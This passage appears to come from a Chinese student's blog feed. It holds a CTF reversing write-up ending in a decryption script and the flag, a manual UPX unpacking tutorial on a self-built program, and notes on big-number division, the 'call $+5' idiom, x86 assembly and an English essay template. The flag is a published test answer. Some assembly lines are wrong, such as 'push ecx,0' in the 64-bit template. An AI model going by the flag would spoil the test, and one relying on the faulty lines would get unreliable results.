alt="12.png"></p><p>我们跟进到这个<code>sub_7FF78950C0CF</code>函数中，查看这个新的虚函数对程序的处理，找对应哪些地方将我们的输入进行了处理加密</p><p><img src="https://s2.loli.net/2022/07/03/HY9QBmUDOGNRqpw.png" alt="13.png"></p><p><img src="https://s2.loli.net/2022/07/03/mgVECs2GIKQwNhk.png" alt="14.png"></p><p>分析代码发现程序将对应<code>key</code>进行处理成以万为单位，每 4 个数字一组，进行处理，我们将每一个<code>key</code>通过调试进行<code>dump</code>出来，跟据对应的程序加密，可以判断出程序是将<code>key</code>与我们的输入进行大数运算，之后进行比较函数，判断我们的输入</p><p>因此对应的解密脚本可以编写了，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>res = <span class="hljs-number">834572051814337070469744559761199605121805728622619480039894407167152612470842477813941120780374570205930952883661000998715107231695919001238818879944773516507366865633886966330912156402063735306303966193481658066437563587241718036562480496368592194719092339868512773222711600878782903109949779245500098606570248830570792028831133949440164219842871034275938433</span><br>res = res + <span class="hljs-number">57705573952449699620072104055030025886984180500734382250587152417040141679598894</span><br>res = res - <span class="hljs-number">71119332457202863671922045224905384620742912949065190274173724688764272313900465</span><br>res = res + <span class="hljs-number">55079029772840138145785005601340325789675668817561045403173659223377346727295749</span><br>res = res - <span class="hljs-number">14385283226689171523445844388769467232023411467394422980403729848631619308579599</span><br>res = res + <span class="hljs-number">80793226935699295824618519685638809874579343342564712419235587177713165502121664</span><br>res = res // <span class="hljs-number">7537302706582391238853817483600228733479333152488218477840149847189049516952787</span><br>res = res - <span class="hljs-number">17867047589171477574847737912328753108849304549280205992204587760361310317983607</span><br>res = res + <span class="hljs-number">55440851777679184418972581091796582321001517732868509947716453414109025036506793</span><br>res = res // <span class="hljs-number">11783410410469738048283152171898507679537812634841032055361622989575562121323526</span><br>res = res - <span class="hljs-number">64584540291872516627894939590684951703479643371381420434698676192916126802789388</span><br><br>s = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> res:<br>    s += <span class="hljs-built_in">chr</span>(res % <span class="hljs-number">128</span>)<br>    res = res // <span class="hljs-number">128</span><br><br><span class="hljs-built_in">print</span>(base64.b64decode(s))<br><span class="hljs-comment"># ACTF&#123;dr0pp3r_1s_v3ry_int3r3st1ng_1d7a90a63039831c7fcaa53b766d5b2d!!!!!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大数除法</title>
    <link href="/2022/07/01/%E5%A4%A7%E6%95%B0%E9%99%A4%E6%B3%95/"/>
    <url>/2022/07/01/%E5%A4%A7%E6%95%B0%E9%99%A4%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="简单举例">简单举例</h2><p>以7546除23为例。</p><p>先减去23的100倍，就是2300，可以减3次，余下646。  此时商就是300；</p><p>然后646减去23的10倍，就是230，可以减2次，余下186。此时商就是320；</p><p>然后186减去23，可以减8次，此时商就是328.</p><h2 id="原因说明">原因说明</h2><p>对于大数除法来说其本质上也是大数减法的一种延续，我们除以一个数字可以采用多次减去该数，而能减去的次数便是我们所需要的商，但是一个很大的数反复减去一个比它小的数字，这样计算的效率太低了。</p><p>于是我们采用减去除数的$10^n$来进行计算，通过这样的多次减法运算，将每次减的次数乘以$10^n$便是此次过程中的商，当我们减完之后会得到多个商(每次减的次数乘以$10^n$后的结果)，我们将其加起来便可以得到我们需要的商。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//需要注意哦，之前的输入函数已经将输入的数据反序了</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">High_division</span><span class="hljs-params">(node a,<span class="hljs-keyword">int</span> x,node &amp;c,<span class="hljs-keyword">int</span> &amp;yu)</span><span class="hljs-comment">//a 被除数 x 除数 </span></span><br><span class="hljs-function"></span>&#123;  <span class="hljs-comment">//c=a/x;yu=a%x;</span><br><span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> beichu; <span class="hljs-comment">//声明被除数的大小</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=a.l<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;--i)<span class="hljs-comment">//从a的最后一项开始</span><br>&#123;<br>beichu=a.s[i]+yu*<span class="hljs-number">10</span>; <span class="hljs-comment">//每一次的被除数 比如输入 50/3 那么第一次求商的第一位也就是1之后余下来2，我们将2乘10再加上被除数下一位的数字，便是新的被除数 </span><br>c.s[i]=beichu/x; <span class="hljs-comment">//能够减去的次数</span><br>yu=beichu%x;     <span class="hljs-comment">//求每次的余数</span><br>&#125;<br>c.l=a.l;<br><span class="hljs-keyword">while</span>(c.s[c.l<span class="hljs-number">-1</span>]==<span class="hljs-number">0</span>&amp;&amp;c.l&gt;<span class="hljs-number">1</span>) <span class="hljs-comment">//去除前面的0</span><br>c.l--;<br>    <span class="hljs-comment">//因为数据都是以字符串的形式进行存储的在计算后前面会多出来一些0(初始化时设置的)，我们的对应结果需要将其去除</span><br>&#125;<br></code></pre></td></tr></table></figure><p>拿上面的代码再举一个例子</p><p><code>50/3</code></p><p>我们最先将余数初始为<code>0</code>，之后进入到对应的循环<code>for</code>中，第一次<code>beichu</code>等于<code>5</code>(之前的输入函数已经将输入的数据反序了)，那么能够减去的次数为<code>1</code>，之后余数为<code>2</code>，此时<code>c.s[]</code>的最后一位存储的便是<code>1</code>，我们第二次进入到循环中去，此时的<code>beichu</code>便变为了<code>20</code>(2*10+0),再经过一次除可以得到是<code>6</code>，此时<code>c.s[]</code>的倒数第二位存储的便是<code>6</code>，之后我们将<code>c.s[]</code>的长度，假设为<code>len</code>进行获取，第一位(下标为0)乘以$10^{len}$次方，之后每次将其<code>len</code>减一，后面一项乘以相应的10的次方便可以啦，最后将每次乘出来的结果进行相加便可以了。</p>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>upx 手动脱壳</title>
    <link href="/2022/07/01/UPX%20%E8%84%B1%E5%A3%B3%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/07/01/UPX%20%E8%84%B1%E5%A3%B3%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>最近遇到好多<code>UPX</code>类型的题目，大多都是直接使用<code>upx -d</code>进行脱壳的，没有真正去理解如何完成脱壳的一个过程。同时也存在一些题目直接使用<code>upx -d</code>进行脱壳后会出现无法运行的情况，特此写下此文章以供后者学习。</p><h2 id="准备部分">准备部分</h2><p>我们先准备好<code>upx.exe</code>文件，同时编写一个简单的程序，利用<code>upx.exe</code>对其进行加壳，此处采用一个简单的<code>Hello world</code>来进行练习，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;Hello world&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>我们将其进行编译，之后利用<code>upx</code>进行加壳，命令为<code>upx [filename]</code></p><p><img src="https://s2.loli.net/2022/07/01/a7velXtmfyJhzi2.png" alt=""></p><p>可以成功看到我们已经加上了一个<code>UPX</code>壳，拖入<code>PE</code>查看也可以同样看到<code>UPX</code>的特征</p><p><img src="https://s2.loli.net/2022/07/01/NvycFL2G6ObrKg3.png" alt=""></p><p>至此准备工作已经完成，接下来便是尝试手动脱壳</p><h2 id="脱壳">脱壳</h2><p>我们想要进行手动脱<code>upx</code>壳不太建议拿<code>ida</code>进行，可以拿<code>od</code>或者是<code>xdbg</code>进行脱壳，此处我们采用<code>xdbg64</code>脱壳(PE文件提示是64位的程序)，将程序直接拖入</p><p><img src="https://s2.loli.net/2022/07/01/grbhp46HvRSlkGu.png" alt="3.png"></p><p>可以较为清楚的看到程序就已经进入到调试模式了，接下来我们不断按<code>F8</code>进行跑程序,在这过程中我们需要注意的是当程序有往上跳转的趋势的时候我们需要在下一条语句处点击一下再按<code>F4</code>进行跳过，之后我们会遇到<code>EntryPoint</code></p><p><img src="https://s2.loli.net/2022/07/01/KhuiIzksN4XwTo2.png" alt="4.png"></p><blockquote><p>对于 64 位程序来说没有像 32 位程序的<code>POPAD</code>指令能对所有寄存器进行压栈保存处理，英雌是依次进行<code>push</code>入栈来进行保存</p></blockquote><p>找到<code>EntryPoint</code>后我们将<code>ESP</code>进行设置硬件断点</p><p><img src="https://s2.loli.net/2022/07/01/Frg6k3VKUhjlxDm.png" alt="5.png"></p><p>在设置完后我们按<code>F9</code>进行运行同时观察程序跳转的位置</p><p><img src="https://s2.loli.net/2022/07/01/pTgh384IzO2tXvx.png" alt="6.png"></p><p>找到<code>OEP</code>之后我们按<code>F8</code>进行跳转进入，之后便可以进行<code>dump</code>内存来进行脱壳操作</p><p><img src="https://s2.loli.net/2022/07/01/6dSETqtjMxX9mYA.png" alt="7.png"></p><p><img src="https://s2.loli.net/2022/07/01/sEkuYq35GcOIdD9.png" alt="8.png"></p><blockquote><p>如果中间出现了红叉(×)，可以右键删除，参考下方<code>IAT</code>处修复的图</p></blockquote><p>处理完毕后我们可以得到一个<code>exe</code>文件，此时我们再拖入<code>PE</code>进行查看壳</p><p><img src="https://s2.loli.net/2022/07/01/s65qJ8RWk2YIbct.png" alt="9.png"></p><p>可以成功看到我们已经将壳进行去除了，但是如果我们将程序运行一下，却会发现如下情况：</p><p><img src="https://s2.loli.net/2022/07/01/L7giuSJD6EnGtsV.png" alt="10.png"></p><p>此时我们需要修复对应的<code>IAT</code>才能成功的运行程序</p><h2 id="IAT修复">IAT修复</h2><p>我们再次调试到<code>OEP</code>，采用和之前<code>dump</code>一样的方式，此时我们选择下面的<code>fix dump</code>对<code>IAT</code>表进行修复</p><p><img src="https://s2.loli.net/2022/07/01/oxWFtT2QMrEKX5H.png" alt="13.png"></p><p>同时如果修复完成后出现如下错误，注意关闭一下杀毒软件如：360(罪魁祸首)</p><p><img src="https://s2.loli.net/2022/07/01/ZpFBTbDsq1kPuCe.png" alt="14.png"></p><p>之后程序就可以运行起来啦，至此脱壳也就结束了</p><p><img src="https://s2.loli.net/2022/07/01/DabhyPd9vOVxjqQ.png" alt="15.png"></p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>英语观点选择作文模板</title>
    <link href="/2022/07/01/%E8%8B%B1%E8%AF%AD%E8%A7%82%E7%82%B9%E9%80%89%E6%8B%A9%E4%BD%9C%E6%96%87%E6%A8%A1%E6%9D%BF/"/>
    <url>/2022/07/01/%E8%8B%B1%E8%AF%AD%E8%A7%82%E7%82%B9%E9%80%89%E6%8B%A9%E4%BD%9C%E6%96%87%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="题目：毕业后找工作-or-创业">题目：毕业后找工作 or 创业</h2><h3 id="第一段">第一段</h3><p>With the rapid development/ globalization of（——填：society, culture, medical service, education, economy）</p><p><strong>引出问题，背景：Nowadays（youngsters/students）have different options upon</strong> （——例子：graduation.）</p><p><strong>例举选择：Some think that</strong>（——例子：to find a job somewhere）<strong>is beneficial, while others think</strong>（——例子：to start a business of their own）<strong>is a better choice.</strong></p><p><strong>做出选择：Personally, I prefer the former/ latter.</strong></p><p>The following reasons can account for my preference.（过渡句）</p><h3 id="第二段">第二段</h3><p><strong>论点1：First and foremost, there is no doubt that</strong>（——例子：to find a job somewhere is more free.）</p><p><strong>论据1：Based on big data, a majority of</strong>（successful social elites have）<strong>admitted that</strong> （——例子：their careers are free.）</p><p><strong>论点2：Furthermore/moreover/additionally, it is obvious that</strong>（——例子：we can make useful friends when we have a decent体面 job.）</p><p><strong>论据2：Where there is/are</strong>（——例子：is a good job）<strong>, there is/are</strong> （——例子：are friends）.</p><p>改编自“有志者事竟成”：Where there is a wil, there is a way.</p><p><strong>论点3：Last but not least, no one can deny that</strong>（——例子：to find a job is easier than to start a business.）</p><p><strong>论据3：Although/though</strong> （——例子：some people do succeed, most entrepreneurs/bosses failed when they start.）</p><p>虽然…但是…</p><h3 id="第三段">第三段</h3><p><strong>重申观点：In a word,</strong>  A  <strong>is better/more suitable than</strong>  B .</p><p><strong>提出希望：If we spare no efforts to</strong>（不遗余力）（——例子：work hard in our career）<strong>the future of</strong> （our life） <strong>will be promising and rosy.</strong></p>]]></content>
    
    
    <categories>
      
      <category>School Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>call $+5 pop eax</title>
    <link href="/2022/06/24/call%20$+5%20pop%20eax/"/>
    <url>/2022/06/24/call%20$+5%20pop%20eax/</url>
    
    <content type="html"><![CDATA[<p>有如下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">地址HEX数据反汇编<br>00413930E8 00000000call  00413935 ; call $+5<br>0041393558pop eax<br></code></pre></td></tr></table></figure><p>在进行汇编语言分析时，经常看到标题中的指令流（<code>E800000000 58</code>，第二条肯定是pop指令，但是目的寄存器不一定是<code>eax</code>），这是干什么的呢？</p><p>看起来貌似很神秘，其实结合前后代码的意图可以知道（进行调试），最终<code>eax</code>中存放的数据是<code>0x00413935</code>，而这个<code>0x00413935</code>，恰好就是<code>pop eax</code>指令的地址。因此实际上这条指令流的作用就是获取执行<code>call $+5</code>时，<code>eip</code>的值，也可以简单认为是获取当前指令地址。</p><p>这条指令流的原理也很简单，<code>E8</code>是<code>call</code>指令中的相对跳转指令，它可以带一个<code>dword</code>参数，指明相对跳转的距离（<code>E8 dword offset</code>），计算方式很简单：<code>下一条指令地址+ offset</code> ，便是call指令的目的地。下一条指令地址就是<code>pop eax</code>的地址啦。</p><p>具体分析如下：</p><ol><li><code>CPU</code>执行到<code>E8 00000000</code>时，<code>eip</code>中此时存放的是下一条指令的地址，也就是<code>0x00413935</code>；</li><li><code>CPU</code>执行<code>call</code>指令，将<code>call</code>指令的下一条指令地址<code>push</code>到栈中（也就是<code>0x00413935</code>被<code>push</code>到栈中，这是用于函数调用后返回的）；</li><li>对<code>E8</code>指令进行解析，<code>offset = 0</code>，计算<code>call</code>指令目的跳转地址：<code>下一条指令地址+ offset</code> ，<code>eip</code>被存入<code>0x00413935</code>；</li><li>跳转到<code>0x00413935</code>执行（实际就是<code>call</code>的下一条指令），执行<code>pop eax</code>，从上面的分析可知，此时栈顶的值是<code>0x00413935</code>，因此<code>eax</code>就被赋值<code>0x00413935</code>。</li></ol><p>可能有人可能想，获取当前指令地址，直接<code>mov eax,eip</code>不就行了么？答案是不行的，因为没有指令将<code>eip</code>作为源操作数的。</p>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言学习</title>
    <link href="/2022/06/16/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/06/16/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="基本概念">基本概念</h2><h3 id="一般概念">一般概念</h3><p>汇编语言能够直接访问计算机硬件</p><p>地址总线是单向的，其他的是双向的。</p><blockquote><p>其中地址总线的数量决定了可寻址的存储单元大小，<code>N</code>根地址总线，对应寻址&gt; 空间为<code>2的N次方</code>。</p><p>数据总线的宽度决定了<code>CPU</code>和未接数据传送的速度。</p><p>控制总线决定了<code>CPU</code>对外部器件的控制能力。</p></blockquote><p>汇编器：将程序转换为机器语言<br>连接器：将汇编器生成的单个文件进行组合为一个可执行程序<br>调试器：使程序员单步执行程序，并检查寄存器和内存状态</p><h3 id="与高级语言区别">与高级语言区别</h3><p>高级语言一条语句会被扩展为多条机器语言，而汇编语指令一条语句对应一条机器语言指令<br>同时高级语言易于移植，编译好的程序几乎能在任何计算机系统中运行，汇编语言不可移植，因为它是为特定处理器系列而设计的。</p><h3 id="汇编语言的优势">汇编语言的优势</h3><ol><li>占用内存少，是编写嵌入式程序的理想工具</li><li>允许程序员精确指定程序可执行代码</li><li>可以对计算机硬件进行直接访问，对1要求高速度的代码进行手工优化</li><li>有助于理解计算机硬件、操作系统和应用程序之间的交互</li><li>一些高级语言对其数据进行了抽象，使其对在执行一些底层任务时不如汇编语言方便，如：位控制</li><li>便于编写硬件设备驱动程序</li></ol><h3 id="内存的读写与地址空间">内存的读写与地址空间</h3><p><code>CPU</code>对地址的读写需要进行三类信息的交互：</p><ol><li>存储单元的的地址(地址信息)</li><li>器件的选择，读或写命令(控制信息)</li><li>读或写的数据(数据信息)</li></ol><p>过程：地址线先发送要读取的地址信息，到内存之中，内存找到对应的地址后<code>CPU</code>发送控制信息，进行读或写，随后通过数据线进行读或者写。</p><h3 id="数据表示">数据表示</h3><p><code>十六进制</code>与<code>二进制</code>的加法运算与10进制相似，都是从低位依次相加到高位，大于进制数便进位。需要注意的是可能在加法运算中会发生溢出(最高有效位不足)。</p><p><code>二进制</code>减法可以采用<code>十进制</code>的减法进行运算，同时也可以采用一个较为简单的办法，将<code>被减数</code>的符号位取反，然后两个数相加，忽略掉最高位的进位。</p><h4 id="补码-可逆">补码(可逆)</h4><p><code>二进制数的补码</code>计算：取反后加一</p><blockquote><p>00000001 -&gt; 11111110 -&gt; 11111111</p></blockquote><p><code>十六进制数的补码</code>计算：按位取反(用15减去该位上的数字)后加一</p><blockquote><p>6A3D -&gt; 95C2 + 1 -&gt; 95C3</p></blockquote><h4 id="有符号数进制转换">有符号数进制转换</h4><p>转为二进制：</p><p>将其绝对值转换为二进制数据，如果原来的数据为负，则对该二进制数据求补码</p><p>转为十六进制：</p><p>将其绝对值转换为十六进制数据，如果原来的数据为负，则对该十六进制数据求补码</p><blockquote><p>通过观察16进制数据的最高位可以判断对应的数据的正负性，如果最高位大于等于8，则该数为负数，最高位小于等于7，则该数为正数</p></blockquote><h2 id="x86架构">x86架构</h2><h3 id="一般概念-2">一般概念</h3><p><code>CPU</code>包含寄存器、高频时钟、控制单元、算术逻辑单元</p><p><code>CPU</code>通过控制、地址、数据三种总线与计算机其他部分相联系</p><p>计算机从内存读取数据比从内部寄存器读取数据慢，前者大致消耗<code>4个时钟周期</code>，后者只需要<code>1个时钟周期</code></p><p>指令执行周期：<code>取指 -&gt; 译码 -&gt; 执行</code></p><h3 id="寄存器">寄存器</h3><blockquote><p>EAX是默认使用的乘除指令。它常常被称为扩展累加器寄存器<br>ECX为CPU默认使用的循环计数器<br>ESP用于寻址堆栈(一种系统内存结构)数据。它极少用于一般算术运算和数据传输，通常被称为扩展堆栈指针寄存器<br>ESI和EDI用于高速存储器传输指令，有时也被称为扩展源变址寄存器和扩展目的变址寄存器<br>EBP在高级语言中用来引用堆栈中的函数参数和局部变量。除了高级编程，它不用于一般算术运算和数据传输。它常常被称为扩展帧指针寄存器。<br>实地址模式中，16位段寄存器表示的是预先分配的内存区域的基址，这个内存区域称为段。保护模式中，段寄存器中存放的是段描述符表指针。一些段中存放程序指令(代码)，其他段存放变量(数据)，还有一个堆栈段存放的是局部函数变量和函数参数。<br>EIP为指令指针寄存器，包含下一条将要执行指令的地址。某些机器指令能控制EIP，使得程序分支转向到一个新位置<br>FFLAGS寄存器包含了独立的二进制位。用干控制CPU的操作，或是反映一些CPU操作的结果。有些指令可以测试和控制这些单独的处理器标志位<br>状态标志位状态标志位反映了CPU执行的算术和逻辑操作的结果。其中包括:溢出位、符号位、零标志位、辅助进位标志位、奇偶校验位和进位标志位。<br>进位标志位(CF)，与目标位置相比，无符号算术运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算结果太大或太小时，设置该标志位<br>符号标志位(SF)，算术或逻辑操作产生负结果时，设置该标志位。<br>零标志位(ZF)，算术或逻辑操作产生的结果为零时，设置该标志位。<br>辅助进位标志位(AF)，算术操作在8位操作数中产生了位3向位4的进位时，设置该标志位。<br>奇偶校验标志位(PF)，结果的最低有效字节包含偶数个1时，设置该标志位，否则清除该标志位。一般情况下，如果数据有可能被修改或损坏时，该标志位用于进行错误检测。<br>方向标志位(DF)，控制了串操作指令(MOVS，CMPSSCASLODS与STOS)设置DF标志位将使得串操作指令地址自动递减(从高地址向低地址处理串)。清除DF标志位将使得串操作指令自动递增(从低地址向高地址处理串)。<br>中断允许标志位(IF)，控制处理器对干可屏蔽中断的处理，设置该标志位位可使处理器响应可屏蔽中断；清除则禁止响应可屏蔽中断。<br>跟踪标志位(TF)，设置可启用单步运行模式来调试程序，清除则禁用单步运行模式。</p></blockquote><h3 id="计算机组件">计算机组件</h3><p>主板是微型计算机的心脏，它是一个平面电路板，其上集成了CPU、支持处理器、主存、输入输出接口、电源接口和扩展槽。</p><p>BIOS：基本输入输出系统，用于保存系统软件</p><p>基于<code>Intel</code>的系统使用的是几种基础类型内存：</p><ol><li>只读存储器(ROM)：永久烧录在芯片上，并且不能擦除</li><li>可擦除可编程只读存储器(EPROM)：能用紫外线缓慢擦除，并且重新编程</li><li>动态随机访问存储器(DRAM):通常的内存，在程序运行时保存程序和数据的部件。需要每毫秒进行刷新，以避免丢失数据</li><li>静态RAM(SRAM)：主要用于价格高、速度快的<code>cache</code>存储器，不需要刷新</li><li>图像随机存储器(VRAM)：保存视频数据，其为双端口，可以一个端口刷新显示数据，另一个端口将数据写到显示器</li><li>互补金属氧化物半导体(CMOS)RAM：在系统主板上，保存系统设置信息，由电池供电，因此断电后其中的内容仍能够保留</li></ol><h3 id="输入输出系统">输入输出系统</h3><img src="https://s2.loli.net/2022/06/18/Zqc2es3E7P8C5KM.png" style="zoom: 67%;" /><p>与虚拟机概念相似，输入输出是通过不同层次的访问来实现的。库函数在最高层，操作系统是次高层。BIOS(基本输入输出系统)是一组函数，能直接与硬件设备通信。程序也可以直接访问输入输出设备。</p><h2 id="汇编语言基础">汇编语言基础</h2><h3 id="环境搭建">环境搭建</h3><blockquote><p><a href="https://blog.csdn.net/wa_junye/article/details/105617238">https://blog.csdn.net/wa_junye/article/details/105617238</a></p></blockquote><h3 id="一般概念-3">一般概念</h3><p>数据标号和符号标号的区别</p><blockquote><p>数据标号表示变量的位置它提供了一种简便的方式操作变量，而符号标号表示程序代码的位置，使用冒号结束，通常用于循环与跳转</p></blockquote><p>大小端序</p><blockquote><p>大端序将最高有效字节放在第一个内存地址中，小端序中最低有效字节放在第一个内存地址中</p><p>如存放数据 12345678h 大端序为 12h、34h、56h、78h 小端序为 78h、56h、34h、12h</p></blockquote><p>源文件和列表文件的区别</p><blockquote><p>源文件是ASCII编码的程序源代码， 列表文件包括源文件的副本，行号每条指令的数字地址，每条指令的机器代码字节(十六进制)以及符号表<br>符号表中包含了程序中所使用的所有标识符名称，段和相关信息<br>指令的数字地址是相对程序占用的起点而言的，从<code>0000 0000</code>开始</p></blockquote><p>注释块的编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">comment %<br>注释内容 [ % 可以用其他字符代替 ]<br>%<br></code></pre></td></tr></table></figure><p>DUP 操作符</p><blockquote><p>DUP可以为多个数据项分配存储空间，可以用于初始化或非初始化数据</p><p>如： Array DWORD 200 DUP(?) ; 分配两百个双字空间，同时不将其初始化</p></blockquote><h3 id="基本语言元素">基本语言元素</h3><p>整形常量表达式是算术表达式，包括了整数常量、符号常量和算术运算符。<code>优先级</code>是指当表达式有两个或者更多运算时，隐藏的优先执行顺序</p><p>被<code>.code</code>和<code>.data</code>等伪指令所包括起来的叫<code>段</code></p><blockquote><p>有<code>代码段</code>和<code>数据段</code>还有一种叫<code>堆栈</code></p></blockquote><p>整数常量形式： [{ + | - }] digits [ radix ]</p><blockquote><p>其中radix为对应基数，有如下基数：</p><p>h -&gt; 16进制r -&gt; 编码实数q/o -&gt; 8进制t -&gt; 10进制(备用)</p><p>d -&gt; 10进制y -&gt; 2进制(备用)b -&gt; 2进制</p></blockquote><p>实数常量格式： [ sign ] integer. [ integer ] [ exponent ]</p><blockquote><p>符号和指数的格式如下：</p><p>sign{ +/- }</p><p>exponent E[{ +/- }]integer</p><p>其中<code>E</code>表示十的多少次方： 1E5 = 1 * 10^5 1E-5 = 1*10^-5</p></blockquote><p>保留字、标识符伪指令都是不区分大小写的</p><blockquote><p>保留字包括：指令助记符(如：MOV)、寄存器名称、伪指令(如：.data)、属性(如：BYTE、WORD)、运算符、预定义符号(如：@data)</p><p>标识符的一些规则：</p><ul><li>可以包含 1 - 247 个字符</li><li>不区分大小写</li><li>第一个字符必须以字母、下划线、@、？、$。后续字符可以是数字</li><li>标识符不能和汇编器的保留字相同</li></ul><p>伪指令：嵌入源代码中的命令，由汇编器识别和执行，其不在运行时执行，但是可以定义变量、宏和子程序(函数);为内存段分配名称，执行许多其他汇编器相关的日常任务</p></blockquote><p>指令的基本格式： [ label: ] mnemonic [ operands ] [ ;comment ]</p><blockquote><p>指令在程序汇编编译时变得可执行，汇编器将其翻译为机器语言字节，并且在运行时由<code>CPU</code>加载和执行</p></blockquote><h3 id="变量定义">变量定义</h3><p>定义格式： [ name ] directive initializer [ ,initializer ] (例： A BYTE 100 )</p><img src="https://s2.loli.net/2022/06/19/T5A9gMSzvFW72O6.png" style="zoom: 67%;" /><img src="https://s2.loli.net/2022/06/19/DuCgF3fQchw21BS.png" alt="3.png" style="zoom: 67%;" /><h3 id="32位汇编程序模板">32位汇编程序模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 32位汇编程序模板<br>.386 ; 表示一个32位程序<br>.model flat,stdcall ; 确定程序的内存模式(flat)和子程序调用规范<br>.stack 4096 ;栈空间大小<br>ExitProcess PROTO, dwExitCode:DWORD ; 设置PROTO关键字的返回值<br>.data<br>; 数据段<br>.code<br>main PROC<br>; 程序指令<br><br>INVOKE ExitProcess,0<br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><h3 id="64位汇编程序模板">64位汇编程序模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 64位汇编程序模板<br>ExitProcess PROTO<br>.data<br>; 数据段<br>.code<br>main PROC<br>; 程序指令<br><br>push ecx,0<br>call ExitProcess<br>main ENDP<br>END<br></code></pre></td></tr></table></figure><h2 id="数据传送、寻址和算术运算">数据传送、寻址和算术运算</h2><h3 id="数据传送指令">数据传送指令</h3><p>操作数有 3 种基本类型：</p><ol><li>寄存器操作数 —— 使用<code>CPU</code>内已命名的寄存器</li><li>立即数 —— 使用数字文本表达式</li><li>内存操作数 —— 引用内存位置</li></ol><img src="https://s2.loli.net/2022/06/22/zKEin4w85BWtNyu.png" style="zoom:67%;" /><p><code>MOV</code>指令将源操作数复制到目的操作数，<code>MOVZX</code>在传送过程中执行<code>零扩展</code>，<code>MOVSX</code>执行符号位扩展(一般来说十六进制第一位大于等于 8 的便是负数，扩展符号位 1 ，便会得到 FFF…)</p><p><code>LAHF</code>将<code>EFLAGS</code>寄存器的低字节复制到<code>AH</code>，被复制的标志位包括：符号标志位、零标志位、辅助进位标志位、奇偶标志位和进位标志位，而<code>SAHF</code>将<code>AH</code>的内容复制到<code>EFLAGS</code>寄存器低字节</p><p><code>XCHG</code>用于交换两个操作数内容，需要注意两个操作数的字节大小需要相同</p><p>通过<code>数组名 + 偏移量</code>可以取到对应数组在栈中的某个数据，但如果是<code>数组名 + 元素个数 * 类型长度</code>那么可以得到对应的偏移，如果需要去取对应偏移的值，那么需要加上一个中括号(如 <code>[array+2]</code> )</p><h3 